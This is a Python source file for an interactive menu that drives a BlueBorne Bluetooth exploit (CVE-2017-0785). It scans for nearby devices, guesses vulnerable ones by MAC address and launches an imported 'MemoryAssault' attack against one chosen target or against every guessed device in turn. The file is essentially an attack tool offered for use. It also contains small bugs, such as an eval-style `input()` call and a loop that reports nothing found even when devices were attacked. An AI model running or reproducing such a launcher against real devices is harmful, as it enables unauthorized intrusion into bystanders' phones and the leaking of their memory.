import os
import sys
import time
from mcif.guesser import Guesser


def bluetify():
    result = os.system('service bluetooth restart')

    if (result is not 0):
        sys.exit("ERROR: Couldn't turn bluetooth ON")


def select_device():
    os.system('hciconfig')
    device = raw_input('Choose device to use: ').rstrip()
    os.system('hciconfig %s up' % device)


def scan():
    os.system('hcitool scan')


def guess():
    guesser = Guesser()

    try:
        tries = input('Search attempts to guess [3]: ')
        return guesser.guess(tries)
    except (Exception):
        return guesser.guess(3)


def attack():
    cves = __import__('mcif.cves', globals(), locals(), 'MemoryAssault')
    mac = raw_input('Target (XX:XX:XX:XX:XX:XX): ').rstrip()
    mem_assault = cves.MemoryAssault(mac)
    mem_assault.attack()


def guess_and_attack():
    macs = guess()
    cves = __import__('mcif.cves', globals(), locals(), 'MemoryAssault')

    for addr, name in macs.items():
        print('\nTrying attack for: %s | %s' % (addr, name))
        mem_assault = cves.MemoryAssault(addr)
        mem_assault.attack()
        time.sleep(3)
    else:
        print("The search didn't find any MAC address")


def raise_exit():
    raise SystemExit


def install_requirements():
    print('Installing... please wait')
    os.system('pip install pybluez 1> /dev/null')
    os.system('pip install pwntools 1> /dev/null')


menu = {
    0: {
        'title': 'Install Requirements',
        'handler': install_requirements
    },
    1: {
        'title': 'Set bluetooth ON',
        'handler': bluetify
    },
    2: {
        'title': 'Select bluetooth device',
        'handler': select_device
    },
    3: {
        'title': 'Scan',
        'handler': scan
    },
    5: {
        'title': 'Guess Vulnerabity by MAC',
        'handler': guess
    },
    6: {
        'title': 'Attack (CVE-2017-0785)',
        'handler': attack
    },
    7: {
        'title': 'Guess & Attack (Dictionary based)',
        'handler': guess_and_attack
    },
    99: {
        'title': 'EXIT (You can always exit using ^C)',
        'handler': raise_exit
    }
}


def print_menu():
    for key, value in menu.items():
        print('[%d] %s' % (key, value['title']))


def init():
    print('Welcome BlueBorne Exploit')

    while (True):
        print('\n\n')
        print_menu()

        try:
            key = input('\nChoose an option: ')
            handler = menu[key]['handler']

            handler()

        except (SystemExit, KeyboardInterrupt):
            sys.exit()

        except (KeyError, NameError, SyntaxError, ValueError):
            print ('Wrong option.')


if __name__ == '__main__':
    init()
